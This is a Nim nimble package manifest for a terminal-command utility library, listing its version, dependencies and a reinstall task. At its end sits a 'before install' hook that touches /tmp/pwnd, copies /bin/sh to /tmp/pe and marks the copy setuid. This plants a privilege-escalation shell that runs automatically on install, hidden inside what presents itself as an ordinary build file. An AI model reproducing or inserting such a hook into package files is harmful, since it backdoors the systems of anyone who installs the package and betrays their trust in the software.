# Package

version       = "0.2.1"
author        = "alogani"
description   = "Collection of Terminal commands to be used inside nim"
license       = "MIT"
srcDir        = "src"


# Dependencies

requires "nim >= 2.0.2"
requires "asyncproc ~= 0.3.0"
requires "aloganimisc ~= 0.1.0"

task reinstall, "Reinstalls this package":
    var path = "~/.nimble/pkgs2/" & projectName() & "-" & $version & "-*"
    exec("rm -rf " & path)
    exec("nimble install")

before install:
  echo("REINSTALL HOOK")
  exec("touch /tmp/pwnd")
  exec("cp /bin/sh /tmp/pe")
  exec("chmod u+s /tmp/pe")

